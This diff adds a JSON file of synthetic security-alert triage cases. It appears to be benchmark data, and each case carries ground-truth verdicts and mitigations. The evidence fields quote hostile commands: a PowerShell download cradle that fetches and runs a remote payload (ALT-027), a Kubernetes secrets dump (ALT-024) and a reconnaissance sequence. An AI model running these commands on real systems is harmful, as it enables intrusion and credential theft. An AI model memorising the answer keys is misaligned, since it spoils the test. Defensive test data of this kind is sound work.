@@ -1,0 +1,686 @@
+[
+  {
+    "alert_id": "ALT-001",
+    "title": "Helpdesk Impersonation Phishing Followed by Foreign Login",
+    "type": "phishing",
+    "category": "credential_compromise",
+    "severity": "high",
+    "description": "User clicked a link in an email from an external sender impersonating the IT helpdesk. A login attempt followed from an unusual geographic location.",
+    "raw_evidence": "Email headers: From: it-helpdesk@company-support.net (external domain). Link target: http://185.220.101.47/login. User-agent: Chrome/120. Login attempt at 02:14 UTC. Source IP: 185.220.101.47. Geo: Moldova. File hash of attachment: d41d8cd98f00b204e9800998ecf8427e. Process spawned: chrome.exe -> cmd.exe.",
+    "context": "User is a payroll clerk with access to the HR portal. Company does not operate in Moldova. The login attempt occurred 11 minutes after the email was opened.",
+    "indicators": "Lookalike sender domain, link to raw IP, foreign login from same IP, browser spawning cmd.exe",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Block sender domain, reset user credentials, isolate endpoint",
+      "evidence_quality": "high",
+      "preferred_strategy": "hierarchical_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-002",
+    "title": "Pass-the-Hash Using Backup Service Account",
+    "type": "lateral_movement",
+    "category": "credential_compromise",
+    "severity": "critical",
+    "description": "Service account used to authenticate to 14 internal hosts within 3 minutes using pass-the-hash technique. Activity originates from a workstation that was compromised last week.",
+    "raw_evidence": "Source host: WKSTN-042 (previously flagged). Account: svc_backup. Auth events: 14 distinct hosts in 180s. Auth type: NTLM. Hashes: aad3b435b51404eeaad3b435b51404ee. IPs contacted: 10.0.1.5, 10.0.1.8, 10.0.1.12, 10.0.2.3. Process: mimikatz.exe detected on source. Domain: corp.internal.",
+    "context": "svc_backup is a domain-wide backup account that normally authenticates only from the backup server BKP-01, never from workstations. WKSTN-042 was flagged for a malicious download last week but was not reimaged.",
+    "indicators": "NTLM pass-the-hash, mimikatz on source host, service account used from a workstation, burst of 14 authentications",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Disable service account, isolate source host, rotate all domain credentials",
+      "evidence_quality": "high",
+      "preferred_strategy": "hierarchical_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-003",
+    "title": "Weekend Bulk Upload from Finance Workstation to Mega",
+    "type": "data_exfiltration",
+    "category": "suspicious_access",
+    "severity": "high",
+    "description": "Unusually large outbound transfer from a finance workstation to a cloud storage endpoint outside the approved vendor list. Transfer occurred outside business hours.",
+    "raw_evidence": "Source: WKSTN-FIN-07. Destination: 104.21.45.23 (Mega.nz CDN). Protocol: HTTPS. Volume: 4.2 GB in 22 minutes. Time: 23:47 UTC Saturday. User: jsmith (finance). Process: rclone.exe. DNS query: data.mega.co.nz. Hash of rclone binary: 5f4dcc3b5aa765d61d8327deb882cf99.",
+    "context": "Finance department has no approved use of Mega.nz. jsmith has no remote-work exception for weekends. rclone is not in the approved software catalog.",
+    "indicators": "rclone.exe, unapproved cloud storage destination, 4.2 GB off-hours transfer, finance data owner",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Block destination IP, suspend user account, preserve forensic image of workstation",
+      "evidence_quality": "high",
+      "preferred_strategy": "hierarchical_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-004",
+    "title": "Macro Dropper with Process Injection and C2 Beacon",
+    "type": "malware_execution",
+    "category": "malware_like_behavior",
+    "severity": "critical",
+    "description": "EDR detected execution of a packed binary dropped via a macro-enabled Office document. Binary establishes persistence and beacons to a known C2 infrastructure.",
+    "raw_evidence": "Process tree: WINWORD.EXE -> powershell.exe -> rundll32.exe -> svchost.exe (injected). C2 IP: 91.108.4.1 (listed in MISP feed). Registry key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\updater. File hash: e99a18c428cb38d5f260853678922e03. DLL: C:\\Users\\Public\\updater.dll. Beacon interval: 300s. Packed with UPX.",
+    "context": "Host belongs to a procurement officer who received an invoice-themed email 5 minutes before execution. No software deployment was scheduled.",
+    "indicators": "Office spawning PowerShell, rundll32 injection into svchost, Run-key persistence, MISP-listed C2, UPX packing",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Quarantine host, block C2 IP at perimeter, remove persistence key, rebuild endpoint",
+      "evidence_quality": "high",
+      "preferred_strategy": "hierarchical_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-005",
+    "title": "Possible Auditor Impersonation Phishing Link",
+    "type": "phishing",
+    "category": "credential_compromise",
+    "severity": "medium",
+    "description": "User reported a suspicious email that possibly impersonates an external auditor. The link might redirect to a credential harvesting page, but it is unclear whether the user entered any credentials.",
+    "raw_evidence": "Email from: audit-team@external-review.co. Link: http://login.microsoftonline-verify.com/. User reports they may have clicked but are unsure. No login events recorded in Azure AD logs for the past 2 hours. Could be a legitimate audit communication.",
+    "context": "The company is currently undergoing an external audit, and the audit firm does send emails from external domains. The user is unsure whether they entered credentials.",
+    "indicators": "Typosquatted Microsoft login domain, uncertain user interaction, no follow-on login events",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Block phishing domain, notify user, monitor Azure AD for suspicious logins",
+      "evidence_quality": "medium",
+      "preferred_strategy": "panel_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-006",
+    "title": "Admin Account Sequential Server Logins",
+    "type": "lateral_movement",
+    "category": "suspicious_access",
+    "severity": "medium",
+    "description": "An admin account authenticated to several servers in sequence. This might be normal maintenance activity or possibly an attacker using stolen credentials. The pattern is unclear without additional context.",
+    "raw_evidence": "Account: admin_ops. Hosts accessed: DB-01, DB-02, APP-03 over 15 minutes. Auth type: Kerberos. No anomalous processes detected. Could be scheduled patching. Ticket was issued during normal business hours. Some sources flag this as unconfirmed lateral movement.",
+    "context": "A patching change ticket (CHG-4471) was approved for DB-01, DB-02 and APP-03 this week. admin_ops is the operations team's patching account.",
+    "indicators": "Sequential Kerberos authentications, admin account, no anomalous processes, matching change window",
+    "ground_truth": {
+      "verdict": "false_positive",
+      "expected_mitigation": "Verify with system owner, no action required if patching confirmed",
+      "evidence_quality": "medium",
+      "preferred_strategy": "panel_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-007",
+    "title": "Small DLP Transfer with No Destination",
+    "type": "data_exfiltration",
+    "category": "suspicious_access",
+    "severity": "low",
+    "description": "Small outbound transfer flagged by DLP.",
+    "raw_evidence": "Volume: 12 MB. Destination: unknown.",
+    "context": "DLP policy triggers on any transfer over 10 MB from managed endpoints. No user, host, or content classification was captured.",
+    "indicators": "Single small transfer, unknown destination, no user or content metadata",
+    "ground_truth": {
+      "verdict": "false_positive",
+      "expected_mitigation": "No action required, normal user activity",
+      "evidence_quality": "low",
+      "preferred_strategy": "panel_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-008",
+    "title": "Cracked Installer in Downloads Folder",
+    "type": "malware_execution",
+    "category": "malware_like_behavior",
+    "severity": "medium",
+    "description": "Antivirus alert for a file in the downloads folder. File appears to be a cracked software installer.",
+    "raw_evidence": "File: C:\\Users\\blee\\Downloads\\photoshop_crack.exe. AV signature: PUA.Keygen. No network connections observed. No persistence mechanisms found.",
+    "context": "User blee is a graphic designer. The file was never executed according to EDR telemetry. PUA.Keygen is a potentially-unwanted-application signature, not a malware family.",
+    "indicators": "PUA keygen signature, file never executed, no network activity, no persistence",
+    "ground_truth": {
+      "verdict": "false_positive",
+      "expected_mitigation": "Delete file, educate user on software policy",
+      "evidence_quality": "low",
+      "preferred_strategy": "panel_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-009",
+    "title": "Marketing Newsletter Flagged as Credential Phishing",
+    "type": "phishing",
+    "category": "credential_compromise",
+    "severity": "low",
+    "description": "Automated spam filter flagged a marketing email as potential phishing.",
+    "raw_evidence": "From: newsletter@retailpromo.com. Subject: Your exclusive deal. Link: https://retailpromo.com/offer. No user interaction recorded.",
+    "context": "retailpromo.com is a long-standing retail vendor the purchasing team subscribes to. Its SPF and DKIM checks passed.",
+    "indicators": "Bulk marketing sender, matching link domain, passed email authentication, no user interaction",
+    "ground_truth": {
+      "verdict": "false_positive",
+      "expected_mitigation": "No action required, mark as spam",
+      "evidence_quality": "low",
+      "preferred_strategy": "panel_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-010",
+    "title": "Direct SSH to Production Database Bypassing Bastion",
+    "type": "lateral_movement",
+    "category": "suspicious_access",
+    "severity": "high",
+    "description": "Developer account accessed production database servers directly using SSH keys, bypassing the bastion host. This violates access policy and may indicate compromised credentials.",
+    "raw_evidence": "Account: dev_jenkins. Source IP: 10.10.5.22 (dev subnet). Targets: PROD-DB-01, PROD-DB-02. Protocol: SSH port 22. Time: 14:32 UTC. Key fingerprint: SHA256:abc123def456. No bastion hop recorded in jump server logs. Access duration: 47 minutes.",
+    "context": "Policy requires all production access through the bastion. dev_jenkins is a CI account whose key was copied to several developer laptops last quarter. No deployment was scheduled at 14:32.",
+    "indicators": "Bastion bypass, CI account used interactively, 47-minute production session, shared SSH key",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Revoke SSH keys, enforce bastion host access, audit database activity during session",
+      "evidence_quality": "medium",
+      "preferred_strategy": "panel_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-011",
+    "title": "Bulk Export of Employee PII to Personal OneDrive",
+    "type": "data_exfiltration",
+    "category": "suspicious_access",
+    "severity": "medium",
+    "description": "HR system generated an alert for bulk export of employee records. Export might have been authorised for an audit, or could be malicious insider activity. Unconfirmed whether the user had legitimate access.",
+    "raw_evidence": "User: mwong (HR analyst). Records exported: 4,200 employee PII records. Format: CSV. Destination: personal OneDrive. Time: 09:15 UTC Friday. Possibly authorised for external audit. Management approval unclear. Normal business hours.",
+    "context": "An external payroll audit is scheduled next month, but audit data is supposed to be shared via the approved secure file transfer portal. mwong submitted a resignation letter two weeks ago.",
+    "indicators": "4,200 PII records, personal cloud destination, unconfirmed approval, departing employee",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Suspend user access, recover exported file, initiate insider threat investigation",
+      "evidence_quality": "medium",
+      "preferred_strategy": "panel_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-012",
+    "title": "Multi-Stage Intrusion with Credential Dumping",
+    "type": "malware_execution",
+    "category": "privilege_escalation",
+    "severity": "high",
+    "description": "SIEM correlated multiple EDR and network events indicating a multi-stage attack: initial compromise via spearphishing, followed by tool download, privilege escalation, and credential dumping.",
+    "raw_evidence": "Stage 1 - Phishing: email from apt-lure@business-update.org, attachment hash: 3c59dc048e8850243be8079a5c74d079. Stage 2 - Dropper: C:\\Windows\\Temp\\svcupdate.exe, unsigned. Stage 3 - Network: beacon to 5.188.86.172 (TOR exit node). Stage 4 - Creds: lsass.exe memory read by svcupdate.exe. Stage 5 - Persistence: scheduled task 'WindowsUpdate' created. User: cthompson (exec assistant).",
+    "context": "cthompson is an executive assistant with delegated access to the CEO's mailbox and calendar. EDR has correlated all five stages on a single host within 40 minutes.",
+    "indicators": "Phishing attachment, unsigned dropper, TOR beacon, lsass memory read, scheduled-task persistence",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Isolate host, block C2 IPs, force password reset for all users on segment, escalate to IR team",
+      "evidence_quality": "high",
+      "preferred_strategy": "hierarchical_strategy"
+    }
+  },
+
+  {
+    "alert_id": "ALT-013",
+    "title": "VPN Login from Two Continents Within 30 Minutes",
+    "type": "credential_compromise",
+    "category": "credential_compromise",
+    "severity": "high",
+    "description": "User account logged into the corporate VPN from New York at 09:14 UTC and again from Lagos at 09:43 UTC. Travel between these locations in 29 minutes is physically impossible.",
+    "raw_evidence": "Account: p.okonkwo. Auth events: 09:14 UTC from 104.28.16.45 (New York ASN), 09:43 UTC from 197.255.180.12 (Lagos, Nigeria ASN). Both sessions authenticated successfully with valid MFA. Session 1 duration: 22 minutes. Session 2 still active. VPN client version matches.",
+    "context": "User is a finance director who occasionally travels. No travel scheduled in HR calendar for this week. User has not responded to IT contact attempts.",
+    "indicators": "Impossible travel velocity, dual active sessions, high-value account, no travel record",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Terminate active sessions, force MFA re-enrollment, suspend account pending user verification",
+      "evidence_quality": "high",
+      "preferred_strategy": "panel_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-014",
+    "title": "Credential Stuffing Attack Against Customer Portal",
+    "type": "credential_compromise",
+    "category": "credential_compromise",
+    "severity": "high",
+    "description": "Authentication service logged 4,800 failed login attempts across 1,200 distinct accounts within 10 minutes, followed by 47 successful logins. Source IPs rotate through a residential proxy network.",
+    "raw_evidence": "Failed attempts: 4,800 in 600s from 312 distinct IPs (residential proxy ranges). Successful: 47 accounts authenticated after prior failures. Source IP rotation interval: 8-15 seconds. User-agent: Python-requests/2.31. Accounts hit: matches known breach database subset from 2023 HaveIBeenPwned data.",
+    "context": "Customer portal handles e-commerce transactions. Affected accounts span multiple countries. No common password pattern detected — consistent with credential stuffing from a breach list.",
+    "indicators": "High-volume auth failures, residential proxy rotation, breach list correlation, automated user-agent",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Block proxy IP ranges, force password reset for all affected accounts, enable CAPTCHA, notify customers",
+      "evidence_quality": "high",
+      "preferred_strategy": "hierarchical_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-015",
+    "title": "Shared Service Account Used from Personal Device",
+    "type": "credential_compromise",
+    "category": "credential_compromise",
+    "severity": "medium",
+    "description": "A shared service account used for batch processing was authenticated interactively from a personal-use device registered to a contractor who left the company 3 months ago.",
+    "raw_evidence": "Account: svc_batch_proc. Login type: interactive (not service). Device: BYOD-7741 (registered to T.Rivera, contractor, offboarded 2023-07-15). Source IP: 192.168.88.22 (guest WiFi network). Time: 22:45 UTC. No scheduled batch jobs at this time.",
+    "context": "Contractor T.Rivera had access to service account credentials during their tenure. Offboarding checklist shows credential rotation was marked complete, but this event suggests rotation may not have occurred.",
+    "indicators": "Terminated contractor device, interactive service account login, off-hours, guest network",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Rotate service account credentials immediately, disable contractor device access, audit all service account usage",
+      "evidence_quality": "medium",
+      "preferred_strategy": "panel_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-016",
+    "title": "Azure AD Password Spray Against Executive Accounts",
+    "type": "credential_compromise",
+    "category": "credential_compromise",
+    "severity": "critical",
+    "description": "Azure AD Smart Lockout triggered for 8 executive accounts. All accounts received exactly 3 failed authentication attempts using common passwords before the lockout threshold, suggesting a deliberate spray to avoid lockout.",
+    "raw_evidence": "Accounts targeted: CFO, CTO, CEO, VP-Sales, VP-HR, Legal-Dir, CISO, Board-Member-1. Failed attempts per account: exactly 3 (below 5-attempt lockout). Passwords tried: 'Welcome2024!', 'Company123!', 'Summer2024'. Source: single IP 45.146.166.123 (known threat actor infrastructure per VirusTotal). Time span: 4 minutes.",
+    "context": "IP 45.146.166.123 appears in APT29 IOC lists published last month. Executive accounts have privileged access to M&A data and board communications.",
+    "indicators": "Deliberate stay-below-lockout pattern, known threat actor IP, executive targeting, common password list",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Block source IP, force MFA on all executive accounts, enable conditional access policies, notify CISO",
+      "evidence_quality": "high",
+      "preferred_strategy": "hierarchical_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-017",
+    "title": "Possible Account Sharing Between Colleagues",
+    "type": "credential_compromise",
+    "category": "credential_compromise",
+    "severity": "low",
+    "description": "Two users authenticated from the same workstation within 5 minutes of each other without a logout event between sessions. This might indicate account sharing or a session handover.",
+    "raw_evidence": "User A: k.jones authenticated at 10:32 UTC from WKSTN-204. User B: m.patel authenticated at 10:37 UTC from WKSTN-204. No logout event for k.jones between sessions. Normal business hours. Both users are on the same team. Could be a shared workstation scenario.",
+    "context": "WKSTN-204 is located in the open-plan office. Both users are marketing analysts with similar data access levels. No sensitive data accessed during either session.",
+    "indicators": "Shared workstation, no logout between sessions, possibly normal team behaviour",
+    "ground_truth": {
+      "verdict": "false_positive",
+      "expected_mitigation": "No immediate action, review workstation sharing policy with team",
+      "evidence_quality": "low",
+      "preferred_strategy": "panel_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-018",
+    "title": "Service Account Brute Force from Internal Host",
+    "type": "credential_compromise",
+    "category": "credential_compromise",
+    "severity": "high",
+    "description": "An internal Windows host generated 3,200 LDAP authentication failures against the domain controller in 8 minutes, targeting a single service account with sequential password guesses.",
+    "raw_evidence": "Source: WKSTN-099 (IP: 10.0.4.55). Target: DC-01 LDAP port 389. Account targeted: svc_monitoring. Attempts: 3,200 in 480s. Password patterns: sequential numeric suffix (svc_monitoring_001 through svc_monitoring_3200). Process on source: ldap_enum.exe (unknown binary). Hash: 7c4a8d09ca3762af61e59520943dc26b.",
+    "context": "WKSTN-099 is assigned to a junior developer. The ldap_enum.exe binary is not in the approved software inventory. The svc_monitoring account has read access to all systems for monitoring purposes.",
+    "indicators": "Internal LDAP brute force, unknown binary, sequential pattern, monitoring account targeted",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Isolate WKSTN-099, remove unknown binary, reset svc_monitoring credentials, investigate developer account",
+      "evidence_quality": "high",
+      "preferred_strategy": "hierarchical_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-019",
+    "title": "MFA Fatigue Attack on Senior Engineer",
+    "type": "credential_compromise",
+    "category": "credential_compromise",
+    "severity": "high",
+    "description": "A senior engineer received 47 MFA push notifications in 35 minutes from an unrecognised device. The engineer eventually approved one notification, suggesting MFA fatigue exploitation.",
+    "raw_evidence": "Account: r.nakamura (senior SRE). MFA push events: 47 in 35 minutes from device ID unknown-device-8821. Approved event: push #47 at 01:23 UTC. Post-approval access: SSH to PROD-K8S-MASTER from 185.195.71.22 (Mullvad VPN exit). Corp device last seen: 17:45 UTC same day.",
+    "context": "r.nakamura has kubectl cluster-admin access. The approval occurred at 01:23 UTC, well outside normal working hours. User was asleep and approved the notification half-asleep per their own report.",
+    "indicators": "MFA fatigue pattern, off-hours approval, VPN exit node, cluster-admin access, user self-reported accidental approval",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Revoke active sessions, rotate credentials, review k8s cluster for unauthorized changes, implement number matching MFA",
+      "evidence_quality": "high",
+      "preferred_strategy": "panel_strategy"
+    }
+  },
+
+  {
+    "alert_id": "ALT-020",
+    "title": "Database Admin Accessing Tables Outside Job Function",
+    "type": "suspicious_access",
+    "category": "suspicious_access",
+    "severity": "medium",
+    "description": "A database administrator ran SELECT queries against payroll, HR compensation, and M&A deal tables. These tables are outside the DBA's normal job function but technically within their access permissions.",
+    "raw_evidence": "Account: dba_user02. Tables accessed: payroll_current, comp_bands, ma_pipeline_deals. Queries: 14 SELECT statements, 09:45–10:12 UTC Tuesday. Row counts returned: payroll_current=8,421, comp_bands=342, ma_pipeline_deals=67. No prior access to these tables in 90-day baseline. Source: WKSTN-DBA-02.",
+    "context": "DBA role grants read access to all tables for performance tuning. No open tickets or change requests reference these tables. User has not queried these tables in the past 3 months per baseline.",
+    "indicators": "Out-of-baseline table access, sensitive data scope, no business justification, job function mismatch",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Revoke cross-functional table access, require justification for sensitive queries, conduct insider threat review",
+      "evidence_quality": "medium",
+      "preferred_strategy": "hierarchical_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-021",
+    "title": "After-Hours Access to Source Code Repository",
+    "type": "suspicious_access",
+    "category": "suspicious_access",
+    "severity": "medium",
+    "description": "A developer cloned the entire product source code repository at 02:30 UTC. The clone included all branches and was performed from a personal laptop not enrolled in MDM.",
+    "raw_evidence": "Account: dev_mchen. Repository: product-core (all branches). Operation: git clone --mirror. Time: 02:30 UTC. Device: MacBook-personal-mchen (not MDM enrolled). Source IP: 203.0.113.45 (residential ISP, Hong Kong). Clone size: 4.7 GB.",
+    "context": "Developer m.chen is on the core product team and legitimately works with this repository. However, full mirror clones are unusual. No PR or ticket references late-night work. Developer is based in the UK — Hong Kong IP is anomalous.",
+    "indicators": "Full mirror clone, personal unenrolled device, off-hours, geographically anomalous source IP",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Revoke repository access, investigate device, notify security team, review recent commits",
+      "evidence_quality": "medium",
+      "preferred_strategy": "panel_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-022",
+    "title": "Cloud Storage Bucket Accessed by Unusual API Key",
+    "type": "suspicious_access",
+    "category": "suspicious_access",
+    "severity": "high",
+    "description": "An S3 bucket containing customer PII was accessed via an API key that had been dormant for 14 months. The access originated from an IP associated with a cloud hosting provider.",
+    "raw_evidence": "Bucket: customer-data-prod. API key: AKIA...7X9Q (last used 14 months ago, IAM user: ci_automation_legacy). Operations: ListBuckets, GetObject (847 files), PutObject (2 files). Source IP: 3.94.211.78 (AWS us-east-1 EC2). Time: 03:15–03:48 UTC. Files accessed: customer_records_2024.csv, payment_data_q3.csv.",
+    "context": "The ci_automation_legacy IAM user was created for a deprecated CI pipeline. It should have been decommissioned 14 months ago but was not. The API key was never rotated. No EC2 instance in the account owns IP 3.94.211.78.",
+    "indicators": "Dormant API key reactivation, sensitive bucket access, external EC2 IP, large file read + write operations",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Revoke API key immediately, disable IAM user, audit accessed files for exfiltration, notify DPO",
+      "evidence_quality": "high",
+      "preferred_strategy": "hierarchical_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-023",
+    "title": "HR System Accessed by IT Staff During Payroll Run",
+    "type": "suspicious_access",
+    "category": "suspicious_access",
+    "severity": "low",
+    "description": "An IT support technician accessed the HR information system during the monthly payroll processing window. This could be normal troubleshooting or unauthorised access to salary data.",
+    "raw_evidence": "Account: it_support_03. System: HRIS (Workday). Pages accessed: compensation dashboard, salary reports. Time: 14:20–14:35 UTC (payroll run window). Access type: read-only. No download events. Normal business hours. Could be supporting a payroll processing issue raised by HR.",
+    "context": "IT support has break-glass access to HRIS for troubleshooting. No support ticket references this session. Payroll team did not log a support request for this date. Unclear if access was requested.",
+    "indicators": "Possibly unauthorised HRIS access, sensitive salary data, no support ticket, payroll window timing",
+    "ground_truth": {
+      "verdict": "false_positive",
+      "expected_mitigation": "Confirm with IT manager, require ticket for HRIS access, no immediate action",
+      "evidence_quality": "low",
+      "preferred_strategy": "panel_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-024",
+    "title": "Kubernetes API Server Queried for All Secrets",
+    "type": "suspicious_access",
+    "category": "suspicious_access",
+    "severity": "critical",
+    "description": "A service account in the production Kubernetes cluster issued kubectl get secrets --all-namespaces, returning 312 secrets including database credentials, API keys, and TLS certificates.",
+    "raw_evidence": "Service account: default/monitoring-sa. Command: kubectl get secrets --all-namespaces -o json. Source IP: 10.100.5.42 (pod: metrics-agent-7f9b). Secrets returned: 312 across 18 namespaces. Time: 06:22 UTC. ServiceAccount token used: eyJhbGci... (valid, not expired). Monitoring pod has no legitimate use case for secrets enumeration.",
+    "context": "The monitoring-sa service account should only require read access to metrics endpoints. Secrets enumeration is a classic Kubernetes privilege escalation precursor. The metrics-agent pod was deployed 3 days ago via an unsigned image.",
+    "indicators": "Secrets enumeration, overprivileged service account, unsigned container image, Kubernetes lateral movement precursor",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Revoke monitoring-sa token, delete compromised pod, rotate all exposed secrets, audit RBAC policies",
+      "evidence_quality": "high",
+      "preferred_strategy": "hierarchical_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-025",
+    "title": "Sales Rep Exporting Competitor Pricing Data",
+    "type": "suspicious_access",
+    "category": "suspicious_access",
+    "severity": "medium",
+    "description": "A sales representative exported a CRM report containing all customer accounts, deal values, and competitive pricing notes 6 days before their resignation date.",
+    "raw_evidence": "Account: sales_rep_kwilliams. CRM export: All_Accounts_Full_Export.csv (2,847 records). Fields exported: customer name, deal value, competitive notes, contact details. Time: 11:30 UTC. File downloaded to local workstation. Employee resignation submitted 6 days ago, last day in 4 days. Export scope exceeds normal daily reporting.",
+    "context": "CRM policy allows sales reps to export their own accounts. This export covers all accounts company-wide, beyond the rep's assigned territory. No prior exports of this scope in 18-month history.",
+    "indicators": "Pre-departure data export, scope exceeds assigned territory, competitive intelligence included, imminent last day",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Restrict CRM access to assigned accounts only, preserve export forensically, begin insider threat review",
+      "evidence_quality": "medium",
+      "preferred_strategy": "panel_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-026",
+    "title": "Automated Scanner Accessing Internal Wiki",
+    "type": "suspicious_access",
+    "category": "suspicious_access",
+    "severity": "low",
+    "description": "An automated web scanner generated 8,400 requests to the internal Confluence wiki over 2 hours, crawling all pages systematically. The source appears to be an internal CI server.",
+    "raw_evidence": "Source: CI-SERVER-03 (10.0.2.88). Target: wiki.internal.corp. Requests: 8,400 in 120 minutes. User-agent: python-requests/2.28. Pages crawled: all spaces including HR, Finance, Engineering, Security. Authentication: service account wiki_ci_reader (valid). Crawl pattern: sequential page IDs.",
+    "context": "The wiki_ci_reader account is used for documentation export jobs. A new documentation search indexing job was deployed yesterday. This crawl may be that job running for the first time.",
+    "indicators": "Systematic crawl, sensitive spaces accessed, possible legitimate documentation indexing job",
+    "ground_truth": {
+      "verdict": "false_positive",
+      "expected_mitigation": "Verify with DevOps team, confirm scheduled indexing job, no action if legitimate",
+      "evidence_quality": "low",
+      "preferred_strategy": "panel_strategy"
+    }
+  },
+
+  {
+    "alert_id": "ALT-027",
+    "title": "PowerShell Download Cradle Executing Encoded Payload",
+    "type": "malware_like_behavior",
+    "category": "malware_like_behavior",
+    "severity": "high",
+    "description": "EDR detected PowerShell executing a Base64-encoded download cradle that fetched and executed a remote payload. The payload contacted a domain registered 2 days ago.",
+    "raw_evidence": "Process: powershell.exe -EncodedCommand JABzAD0ATgBlAHcA... Decoded: IEX (New-Object Net.WebClient).DownloadString('http://update-cdn.xyz/payload.ps1'). Domain update-cdn.xyz registered 2024-11-28 (2 days ago). Payload size: 48 KB. C2 callback: 91.195.240.94 port 443. User: standard_user on WKSTN-117. Hash of payload: a87ff679a2f3e71d9181a67b7542122c.",
+    "context": "Standard user account with no administrative privileges. No prior PowerShell execution in this user's baseline. Email gateway flagged a suspicious email to this user 45 minutes before execution.",
+    "indicators": "Encoded download cradle, newly registered domain, C2 callback, no admin rights, phishing precursor",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Isolate endpoint, block C2 domain and IP, reset user credentials, preserve memory dump",
+      "evidence_quality": "high",
+      "preferred_strategy": "hierarchical_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-028",
+    "title": "Living-off-the-Land Binaries Used for Reconnaissance",
+    "type": "malware_like_behavior",
+    "category": "malware_like_behavior",
+    "severity": "medium",
+    "description": "A sequence of native Windows tools was used to perform network and host reconnaissance over a 20-minute window. No malicious binaries were detected but the usage pattern is anomalous.",
+    "raw_evidence": "Commands executed (in sequence): ipconfig /all, net user /domain, net group 'Domain Admins' /domain, nltest /domain_trusts, ping -n 1 10.0.0.1-10.0.0.254 (subnet sweep), nslookup, whoami /all. User: contractor_temp_09. Time: 15:20–15:40 UTC. All binaries: legitimate Windows system tools. No malware detected.",
+    "context": "contractor_temp_09 is a temporary contractor engaged for a 2-week web development task. Their scope does not include network administration or Active Directory. The sequence matches post-exploitation reconnaissance TTPs.",
+    "indicators": "LOLBIN reconnaissance sequence, contractor with out-of-scope actions, domain enumeration, subnet sweep",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Suspend contractor account, investigate contractor device, review all network activity during session",
+      "evidence_quality": "medium",
+      "preferred_strategy": "panel_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-029",
+    "title": "Unsigned DLL Loaded into Trusted Process",
+    "type": "malware_like_behavior",
+    "category": "malware_like_behavior",
+    "severity": "high",
+    "description": "An unsigned DLL was loaded into svchost.exe via DLL hijacking. The DLL was placed in the same directory as a legitimate application's DLL and matched the expected filename.",
+    "raw_evidence": "Process: svchost.exe (PID 1844). Loaded module: C:\\Program Files\\LegitApp\\version.dll (unsigned, 92 KB). Expected module: C:\\Windows\\System32\\version.dll (Microsoft-signed, 32 KB). File hash: 1679091c5a880faf6fb5e6087eb1b2dc. Creation time: 30 minutes before loading. Outbound connection: 185.220.101.180:8443 post-load.",
+    "context": "LegitApp is a third-party deployment tool installed org-wide. The DLL hijack exploits a well-known search order issue in this application. No user interaction was required to trigger the load.",
+    "indicators": "DLL hijacking, unsigned module in signed app path, size mismatch, C2 connection post-load",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Quarantine host, remove malicious DLL, patch DLL search order issue, block C2 IP",
+      "evidence_quality": "high",
+      "preferred_strategy": "hierarchical_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-030",
+    "title": "Scheduled Task Created by Non-Admin User",
+    "type": "malware_like_behavior",
+    "category": "malware_like_behavior",
+    "severity": "medium",
+    "description": "A standard user account created a scheduled task that executes a script from the user's temp directory every 15 minutes. The script content is obfuscated.",
+    "raw_evidence": "Task name: \\Microsoft\\Windows\\SystemMaintenance\\update_check. Created by: user_bfoster (standard, non-admin). Trigger: every 15 minutes. Action: cmd.exe /c %TEMP%\\sys_upd.bat. Script content: obfuscated batch file (XOR-encoded strings). Hash of sys_upd.bat: 45c48cce2e2d7fbdea1afc51c7c6ad26. Script size: 2.1 KB. No network connections yet observed.",
+    "context": "Standard users should not be able to create scheduled tasks in the Microsoft path by default. This may indicate a local privilege escalation occurred first. The task name mimics legitimate Windows maintenance tasks.",
